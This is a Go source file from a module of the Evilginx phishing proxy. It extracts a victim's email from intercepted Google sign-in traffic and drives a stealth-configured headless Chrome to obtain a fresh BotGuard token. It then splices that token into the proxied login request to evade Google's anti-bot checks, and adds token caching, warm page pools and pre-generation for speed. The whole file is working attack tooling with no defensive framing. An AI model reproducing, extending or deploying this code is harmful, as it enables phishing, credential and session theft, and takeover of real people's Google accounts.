package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

// ============================================================================
// OPTIMIZED EVILPUPPET - Based on Evilginx Pro research
// Key optimizations:
// 1. Pre-warmed Chrome with persistent browser instance
// 2. Token caching per email (5 min TTL)
// 3. Warm page pool for faster token generation
// 4. Async token generation with callback
// ============================================================================

type GoogleBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	isHeadless     bool
	withDevTools   bool
	slowMotionTime time.Duration

	token string
	email string
}

var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

// ============================================================================
// GLOBAL STATE - Persistent browser and token cache
// ============================================================================

var (
	// Chrome process management
	chromeMutex      sync.Mutex
	chromeReady      bool = false
	chromeReadyMutex sync.RWMutex

	// Persistent browser instance (kept warm)
	globalBrowser     *rod.Browser
	globalBrowserLock sync.Mutex

	// Token cache with TTL
	tokenCache     = make(map[string]*cachedToken)
	tokenCacheLock sync.RWMutex

	// Warm page pool
	warmPagePool     []*rod.Page
	warmPagePoolLock sync.Mutex
	warmPagePoolSize = 3 // Keep 3 warm pages ready

	// Connection health tracking
	lastHealthCheck     time.Time
	healthCheckInterval = 30 * time.Second
)

type cachedToken struct {
	token     string
	email     string
	createdAt time.Time
	ttl       time.Duration
}

func (ct *cachedToken) isValid() bool {
	return time.Since(ct.createdAt) < ct.ttl
}

// ============================================================================
// TOKEN CACHE FUNCTIONS
// ============================================================================

// GetCachedToken returns a cached token if available and valid
func GetCachedToken(email string) (string, bool) {
	tokenCacheLock.RLock()
	defer tokenCacheLock.RUnlock()

	if cached, exists := tokenCache[email]; exists && cached.isValid() {
		log.Info("[GoogleBypasser] Cache HIT for email: %s", email)
		return cached.token, true
	}
	return "", false
}

// SetCachedToken stores a token in the cache
func SetCachedToken(email, token string) {
	tokenCacheLock.Lock()
	defer tokenCacheLock.Unlock()

	tokenCache[email] = &cachedToken{
		token:     token,
		email:     email,
		createdAt: time.Now(),
		ttl:       5 * time.Minute, // 5 minute TTL
	}
	log.Info("[GoogleBypasser] Cached token for email: %s (TTL: 5 min)", email)
}

// CleanExpiredTokens removes expired tokens from cache
func CleanExpiredTokens() {
	tokenCacheLock.Lock()
	defer tokenCacheLock.Unlock()

	for email, cached := range tokenCache {
		if !cached.isValid() {
			delete(tokenCache, email)
			log.Debug("[GoogleBypasser] Removed expired token for: %s", email)
		}
	}
}

// ============================================================================
// CHROME MANAGEMENT - Persistent browser instance
// ============================================================================

// findChromeBinary finds the Chrome/Chromium binary path
func findChromeBinary() (string, error) {
	chromePaths := []string{
		"google-chrome",
		"google-chrome-stable",
		"chromium-browser",
		"chromium",
		"/usr/bin/google-chrome",
		"/usr/bin/google-chrome-stable",
		"/usr/bin/chromium-browser",
		"/usr/bin/chromium",
		"/opt/google/chrome/google-chrome",
		"/snap/bin/chromium",
	}

	for _, path := range chromePaths {
		if fullPath, err := exec.LookPath(path); err == nil {
			return fullPath, nil
		}
	}

	return "", fmt.Errorf("Chrome/Chromium binary not found. Please install Google Chrome or Chromium")
}

// isChromeRunning checks if Chrome is running on port 9222
func isChromeRunning() bool {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// startChromeHeadless starts Chrome in headless mode with remote debugging
// OPTIMIZATION: Added stealth flags to avoid detection
func startChromeHeadless() error {
	chromeMutex.Lock()
	defer chromeMutex.Unlock()

	if isChromeRunning() {
		log.Info("[GoogleBypasser] Chrome is already running on port 9222")
		return nil
	}

	chromePath, err := findChromeBinary()
	if err != nil {
		return err
	}

	log.Info("[GoogleBypasser] Starting Chrome headless: %s", chromePath)

	// OPTIMIZATION: Added more stealth flags
	cmd := exec.Command(chromePath,
		"--headless=new", // Use new headless mode (more stealthy)
		"--disable-gpu",
		"--no-sandbox",
		"--disable-dev-shm-usage",
		"--remote-debugging-port=9222",
		"--remote-debugging-address=127.0.0.1",
		"--disable-background-networking",
		"--disable-default-apps",
		"--disable-extensions",
		"--disable-sync",
		"--disable-translate",
		"--hide-scrollbars",
		"--metrics-recording-only",
		"--mute-audio",
		"--no-first-run",
		"--safebrowsing-disable-auto-update",
		// Stealth flags
		"--disable-blink-features=AutomationControlled",
		"--disable-infobars",
		"--window-size=1920,1080",
		"--start-maximized",
		"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	)

	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start Chrome: %v", err)
	}

	log.Info("[GoogleBypasser] Chrome process started with PID: %d", cmd.Process.Pid)

	// Wait for Chrome to be ready
	for i := 0; i < 20; i++ {
		time.Sleep(500 * time.Millisecond)
		if isChromeRunning() {
			log.Success("[GoogleBypasser] Chrome is now running on port 9222")
			return nil
		}
	}

	return fmt.Errorf("Chrome started but not responding on port 9222 after 10 seconds")
}

// ensureChromeRunning ensures Chrome is running, starting it if necessary
func ensureChromeRunning() error {
	maxRetries := 3

	for attempt := 1; attempt <= maxRetries; attempt++ {
		if isChromeRunning() {
			return nil
		}

		log.Warning("[GoogleBypasser] Chrome not running (attempt %d/%d), starting...", attempt, maxRetries)

		if err := startChromeHeadless(); err != nil {
			log.Error("[GoogleBypasser] Failed to start Chrome: %v", err)
			if attempt < maxRetries {
				time.Sleep(2 * time.Second)
				continue
			}
			return err
		}

		if isChromeRunning() {
			return nil
		}
	}

	return fmt.Errorf("failed to ensure Chrome is running after %d attempts", maxRetries)
}

func getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}

	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}

	ws, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok || ws == "" {
		return "", fmt.Errorf("webSocketDebuggerUrl not found")
	}

	return ws, nil
}

// ============================================================================
// GLOBAL BROWSER MANAGEMENT - Keep browser warm with health checks
// ============================================================================

// isBrowserConnected checks if the browser connection is still alive
func isBrowserConnected(browser *rod.Browser) bool {
	if browser == nil {
		return false
	}

	// Try a simple operation to verify connection is alive
	defer func() {
		if r := recover(); r != nil {
			log.Debug("[GoogleBypasser] Browser connection check failed (panic recovered)")
		}
	}()

	_, err := browser.Version()
	return err == nil
}

// isPageValid checks if a page is still valid and connected
func isPageValid(page *rod.Page) bool {
	if page == nil {
		return false
	}

	defer func() {
		if r := recover(); r != nil {
			log.Debug("[GoogleBypasser] Page validation failed (panic recovered)")
		}
	}()

	// Try to get page info - this will fail if page is disconnected
	_, err := page.Info()
	return err == nil
}

// isConnectionError checks if an error is a connection-related error
func isConnectionError(err error) bool {
	if err == nil {
		return false
	}
	errStr := err.Error()
	return strings.Contains(errStr, "closed network connection") ||
		strings.Contains(errStr, "connection refused") ||
		strings.Contains(errStr, "EOF") ||
		strings.Contains(errStr, "broken pipe") ||
		strings.Contains(errStr, "connection reset")
}

// forceReconnect forces a browser reconnection
func forceReconnect() {
	globalBrowserLock.Lock()
	globalBrowser = nil
	globalBrowserLock.Unlock()
	invalidateWarmPagePool()
	log.Warning("[GoogleBypasser] Forced browser reconnection")
}

// invalidateWarmPagePool clears all warm pages (called when browser reconnects)
func invalidateWarmPagePool() {
	warmPagePoolLock.Lock()
	defer warmPagePoolLock.Unlock()

	if len(warmPagePool) > 0 {
		log.Warning("[GoogleBypasser] Invalidating %d warm pages due to browser reconnection", len(warmPagePool))
		// Close all pages gracefully
		for _, page := range warmPagePool {
			go func(p *rod.Page) {
				defer func() { recover() }() // Ignore errors on stale pages
				p.Close()
			}(page)
		}
		warmPagePool = nil
	}
}

// GetGlobalBrowser returns the persistent browser instance, creating it if needed
// ENHANCED: Now includes health check and automatic reconnection
func GetGlobalBrowser() (*rod.Browser, error) {
	globalBrowserLock.Lock()
	defer globalBrowserLock.Unlock()

	// Check if existing browser is still connected
	if globalBrowser != nil {
		// Perform health check if enough time has passed
		if time.Since(lastHealthCheck) > healthCheckInterval {
			lastHealthCheck = time.Now()
			if !isBrowserConnected(globalBrowser) {
				log.Warning("[GoogleBypasser] Browser connection lost, reconnecting...")
				globalBrowser = nil
				invalidateWarmPagePool()
			}
		} else {
			// Quick check - just verify Chrome is still running
			if !isChromeRunning() {
				log.Warning("[GoogleBypasser] Chrome process died, reconnecting...")
				globalBrowser = nil
				invalidateWarmPagePool()
			}
		}
	}

	// If we have a valid browser, return it
	if globalBrowser != nil {
		return globalBrowser, nil
	}

	// Ensure Chrome is running
	if err := ensureChromeRunning(); err != nil {
		return nil, err
	}

	// Get WebSocket URL
	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		return nil, err
	}

	// Create and connect browser
	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		return nil, err
	}

	globalBrowser = browser
	lastHealthCheck = time.Now()
	log.Success("[GoogleBypasser] Global browser instance created and connected")

	return globalBrowser, nil
}

// ============================================================================
// WARM PAGE POOL - Pre-create pages for faster token generation
// ============================================================================

// InitWarmPagePool creates warm pages that are pre-navigated to Google
func InitWarmPagePool() error {
	warmPagePoolLock.Lock()
	defer warmPagePoolLock.Unlock()

	browser, err := GetGlobalBrowser()
	if err != nil {
		return err
	}

	log.Info("[GoogleBypasser] Initializing warm page pool (size: %d)...", warmPagePoolSize)

	for i := 0; i < warmPagePoolSize; i++ {
		page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
		if err != nil {
			log.Warning("[GoogleBypasser] Failed to create warm page %d: %v", i, err)
			continue
		}

		// Pre-navigate to Google login page
		go func(p *rod.Page, idx int) {
			if err := p.Navigate("https://accounts.google.com/"); err != nil {
				log.Warning("[GoogleBypasser] Failed to pre-navigate warm page %d: %v", idx, err)
				return
			}
			p.MustWaitLoad()
			log.Debug("[GoogleBypasser] Warm page %d ready at accounts.google.com", idx)
		}(page, i)

		warmPagePool = append(warmPagePool, page)
	}

	log.Success("[GoogleBypasser] Warm page pool initialized with %d pages", len(warmPagePool))
	return nil
}

// GetWarmPage returns a warm page from the pool, or creates a new one
// ENHANCED: Added retry logic for connection failures
func GetWarmPage() (*rod.Page, error) {
	maxRetries := 3

	for attempt := 1; attempt <= maxRetries; attempt++ {
		page, err := getWarmPageInternal()
		if err == nil {
			return page, nil
		}

		// Check if it's a connection error
		if strings.Contains(err.Error(), "closed network connection") ||
			strings.Contains(err.Error(), "connection refused") ||
			strings.Contains(err.Error(), "EOF") {
			log.Warning("[GoogleBypasser] Connection error on attempt %d/%d: %v", attempt, maxRetries, err)

			// Force browser reconnection
			globalBrowserLock.Lock()
			globalBrowser = nil
			globalBrowserLock.Unlock()
			invalidateWarmPagePool()

			if attempt < maxRetries {
				time.Sleep(time.Duration(attempt) * time.Second)
				continue
			}
		}

		return nil, err
	}

	return nil, fmt.Errorf("failed to get warm page after %d attempts", maxRetries)
}

// getWarmPageInternal is the internal implementation of GetWarmPage
// ENHANCED: Now validates pages before returning them
func getWarmPageInternal() (*rod.Page, error) {
	warmPagePoolLock.Lock()
	defer warmPagePoolLock.Unlock()

	// Try to get a valid page from the pool
	for len(warmPagePool) > 0 {
		page := warmPagePool[0]
		warmPagePool = warmPagePool[1:]

		// Validate the page before returning
		if isPageValid(page) {
			log.Debug("[GoogleBypasser] Got valid warm page from pool (remaining: %d)", len(warmPagePool))
			// Replenish the pool in background
			go replenishWarmPagePool()
			return page, nil
		}

		// Page is stale, discard it and try next
		log.Warning("[GoogleBypasser] Discarded stale page from pool")
		go func(p *rod.Page) {
			defer func() { recover() }()
			p.Close()
		}(page)
	}

	// No warm pages available, create a new one
	log.Warning("[GoogleBypasser] Warm page pool empty, creating new page...")
	browser, err := GetGlobalBrowser()
	if err != nil {
		return nil, err
	}

	page, err := browser.Page(proto.TargetCreateTarget{URL: "https://accounts.google.com/"})
	if err != nil {
		return nil, err
	}

	page.MustWaitLoad()
	return page, nil
}

// replenishWarmPagePool adds a new warm page to the pool
func replenishWarmPagePool() {
	warmPagePoolLock.Lock()
	defer warmPagePoolLock.Unlock()

	if len(warmPagePool) >= warmPagePoolSize {
		return
	}

	browser, err := GetGlobalBrowser()
	if err != nil {
		log.Warning("[GoogleBypasser] Failed to get browser for pool replenishment: %v", err)
		return
	}

	page, err := browser.Page(proto.TargetCreateTarget{URL: "https://accounts.google.com/"})
	if err != nil {
		log.Warning("[GoogleBypasser] Failed to create page for pool: %v", err)
		return
	}

	page.MustWaitLoad()
	warmPagePool = append(warmPagePool, page)
	log.Debug("[GoogleBypasser] Replenished warm page pool (size: %d)", len(warmPagePool))
}

// ============================================================================
// PRE-WARM FUNCTION - Call at evilginx startup
// ============================================================================

// PreWarmChrome should be called at startup to ensure Chrome is ready before any requests
// OPTIMIZATION: Now also initializes warm page pool
func PreWarmChrome() error {
	log.Info("[GoogleBypasser] Pre-warming Chrome for BotGuard token generation...")

	// Ensure Chrome is running
	if err := ensureChromeRunning(); err != nil {
		log.Error("[GoogleBypasser] Failed to pre-warm Chrome: %v", err)
		return err
	}

	// Create global browser instance
	browser, err := GetGlobalBrowser()
	if err != nil {
		log.Error("[GoogleBypasser] Failed to create global browser: %v", err)
		return err
	}

	// Initialize warm page pool
	if err := InitWarmPagePool(); err != nil {
		log.Warning("[GoogleBypasser] Failed to initialize warm page pool: %v", err)
		// Continue anyway - we can create pages on demand
	}

	// Mark Chrome as ready
	chromeReadyMutex.Lock()
	chromeReady = true
	chromeReadyMutex.Unlock()

	log.Success("[GoogleBypasser] Chrome pre-warmed and ready!")
	log.Info("[GoogleBypasser] - Global browser: connected")
	log.Info("[GoogleBypasser] - Warm page pool: %d pages ready", len(warmPagePool))
	log.Info("[GoogleBypasser] - Browser version: %s", browser.MustVersion().Product)

	// Start background token cache cleaner
	go func() {
		ticker := time.NewTicker(1 * time.Minute)
		for range ticker.C {
			CleanExpiredTokens()
		}
	}()

	return nil
}

// IsChromeReady returns true if Chrome has been pre-warmed
func IsChromeReady() bool {
	chromeReadyMutex.RLock()
	defer chromeReadyMutex.RUnlock()
	return chromeReady
}

// ============================================================================
// GOOGLE BYPASSER METHODS - Optimized for speed
// ============================================================================

func (b *GoogleBypasser) Launch() {
	log.Debug("[GoogleBypasser]: Launching Browser .. ")

	// OPTIMIZATION: Use warm page from pool instead of creating new browser
	page, err := GetWarmPage()
	if err != nil {
		log.Error("[GoogleBypasser] Failed to get warm page: %v", err)
		// Fallback to original method
		b.launchFallback()
		return
	}

	b.page = page
	b.browser, _ = GetGlobalBrowser()
	log.Debug("[GoogleBypasser]: Using warm page from pool")
}

func (b *GoogleBypasser) launchFallback() {
	log.Warning("[GoogleBypasser] Using fallback launcher...")

	if err := ensureChromeRunning(); err != nil {
		log.Error("[GoogleBypasser] Fallback: Chrome not available, using go-rod launcher")
		l := launcher.New().Headless(b.isHeadless).Devtools(b.withDevTools)
		if os.Geteuid() == 0 {
			l = l.NoSandbox(true)
		}
		wsURL := l.MustLaunch()
		b.browser = rod.New().ControlURL(wsURL)
		if b.slowMotionTime > 0 {
			b.browser = b.browser.SlowMotion(b.slowMotionTime)
		}
		b.browser = b.browser.MustConnect()
		b.page = b.browser.MustPage()
		return
	}

	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		log.Error("[GoogleBypasser] Fallback: Failed to get WebSocket URL: %v", err)
		return
	}

	b.browser = rod.New().ControlURL(wsURL).MustConnect()
	b.page = b.browser.MustPage()
}

func (b *GoogleBypasser) GetEmail(body []byte) {
	exp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
	email_match := exp.FindSubmatch(body)
	matches := len(email_match)
	if matches < 2 {
		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
		return
	}
	log.Debug("[GoogleBypasser]: Found email in body : %v", string(email_match[1]))
	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
	log.Debug("[GoogleBypasser]: Using email to obtain valid token : %v", b.email)
}

func (b *GoogleBypasser) GetToken() {
	// OPTIMIZATION: Check cache first
	if cachedToken, found := GetCachedToken(b.email); found {
		b.token = cachedToken
		log.Success("[GoogleBypasser] Using cached token for %s", b.email)
		return
	}

	// Try to get token with retry on connection errors
	maxRetries := 3
	for attempt := 1; attempt <= maxRetries; attempt++ {
		token, err := b.getTokenInternal()
		if err == nil && token != "" {
			b.token = token
			SetCachedToken(b.email, b.token)
			return
		}

		// Check if it's a connection error that warrants retry
		if isConnectionError(err) {
			log.Warning("[GoogleBypasser] Connection error during GetToken (attempt %d/%d): %v", attempt, maxRetries, err)

			// Force reconnection and get a new page
			forceReconnect()

			if attempt < maxRetries {
				time.Sleep(time.Duration(attempt) * 2 * time.Second)

				// Get a fresh page for retry
				newPage, pageErr := GetWarmPage()
				if pageErr != nil {
					log.Error("[GoogleBypasser] Failed to get new page for retry: %v", pageErr)
					continue
				}
				b.page = newPage
				continue
			}
		}

		if err != nil {
			log.Error("[GoogleBypasser] GetToken failed: %v", err)
		}
	}
}

// getTokenInternal performs the actual token retrieval
func (b *GoogleBypasser) getTokenInternal() (string, error) {
	if b.page == nil {
		return "", fmt.Errorf("page is nil")
	}

	// Validate page before using
	if !isPageValid(b.page) {
		return "", fmt.Errorf("page is not valid (closed network connection)")
	}

	stop := make(chan struct{})
	var once sync.Once
	var token string
	timeout := time.After(30 * time.Second)

	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(e.Request.URL, "rpcids=MI613e") {
			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
			if err != nil {
				log.Error("Failed to decode body while trying to obtain fresh botguard token: %v", err)
				return
			}
			token = bgRegexp.FindString(decodedBody)
			log.Debug("[GoogleBypasser]: Obtained Token : %v", token)
			once.Do(func() { close(stop) })
		}
	})()

	// Navigate to Google login page
	log.Debug("[GoogleBypasser]: Navigating to Google login page...")
	err := b.page.Navigate("https://accounts.google.com/")
	if err != nil {
		return "", fmt.Errorf("failed to navigate: %v", err)
	}

	log.Debug("[GoogleBypasser]: Waiting for the email input field...")
	emailField := b.page.MustWaitLoad().MustElement("#identifierId")
	if emailField == nil {
		return "", fmt.Errorf("failed to find email input field")
	}

	err = emailField.Input(b.email)
	if err != nil {
		return "", fmt.Errorf("failed to input email: %v", err)
	}
	log.Debug("[GoogleBypasser]: Entered target email: %v", b.email)

	err = b.page.Keyboard.Press(input.Enter)
	if err != nil {
		return "", fmt.Errorf("failed to submit form: %v", err)
	}
	log.Debug("[GoogleBypasser]: Submitted Login Form...")

	select {
	case <-stop:
		for token == "" {
			select {
			case <-time.After(500 * time.Millisecond):
				log.Debug("[GoogleBypasser]: Waiting for token...")
			case <-timeout:
				return "", fmt.Errorf("timed out waiting for token")
			}
		}

		// Close the page (it will be replaced by a fresh warm page)
		go func() {
			defer func() { recover() }()
			b.page.Close()
		}()

		return token, nil

	case <-timeout:
		return "", fmt.Errorf("timed out waiting for token")
	}
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	log.Debug("[GoogleBypasser]: Old body : %v", string(body))
	newBody := bgRegexp.ReplaceAllString(string(body), b.token)
	log.Debug("[GoogleBypasser]: New body : %v", newBody)
	return []byte(newBody)
}

// ============================================================================
// ASYNC TOKEN GENERATION - For proactive token generation
// ============================================================================

// GenerateTokenAsync generates a token asynchronously and calls the callback when done
func GenerateTokenAsync(email string, callback func(token string, err error)) {
	go func() {
		// Check cache first
		if cachedToken, found := GetCachedToken(email); found {
			callback(cachedToken, nil)
			return
		}

		// Generate new token
		b := &GoogleBypasser{
			isHeadless:   true,
			withDevTools: false,
			email:        email,
		}

		b.Launch()
		if b.page == nil {
			callback("", fmt.Errorf("failed to launch browser"))
			return
		}

		b.GetToken()
		if b.token == "" {
			callback("", fmt.Errorf("failed to obtain token"))
			return
		}

		callback(b.token, nil)
	}()
}

// PreGenerateToken starts token generation before the MI613e request arrives
// This should be called when the email is detected (e.g., from JS injection)
// ENHANCED: Added retry logic for connection failures
func PreGenerateToken(email string) {
	log.Info("[PreGen] 🚀Pre-generation request for: %s", email)

	// Check if already cached
	if _, found := GetCachedToken(email); found {
		log.Info("[GoogleBypasser] Token already cached for: %s", email)
		return
	}

	// Generate in background with retry
	go func() {
		maxRetries := 3
		for attempt := 1; attempt <= maxRetries; attempt++ {
			log.Info("[GoogleBypasser] Pre-generating token for: %s", email)

			b := &GoogleBypasser{
				isHeadless:   true,
				withDevTools: false,
				email:        email,
			}

			b.Launch()
			if b.page == nil {
				log.Warning("[GoogleBypasser] Pre-generation attempt %d/%d failed: could not launch browser", attempt, maxRetries)
				if attempt < maxRetries {
					time.Sleep(time.Duration(attempt) * 2 * time.Second)
					continue
				}
				log.Error("[GoogleBypasser] Pre-generation failed for %s after %d attempts", email, maxRetries)
				return
			}

			b.GetToken()
			if b.token == "" {
				log.Warning("[GoogleBypasser] Pre-generation attempt %d/%d failed: could not obtain token", attempt, maxRetries)
				if attempt < maxRetries {
					time.Sleep(time.Duration(attempt) * 2 * time.Second)
					continue
				}
				log.Error("[GoogleBypasser] Pre-generation failed for %s after %d attempts", email, maxRetries)
				return
			}

			log.Success("[GoogleBypasser] Pre-generated token for: %s", email)
			return
		}
	}()
}
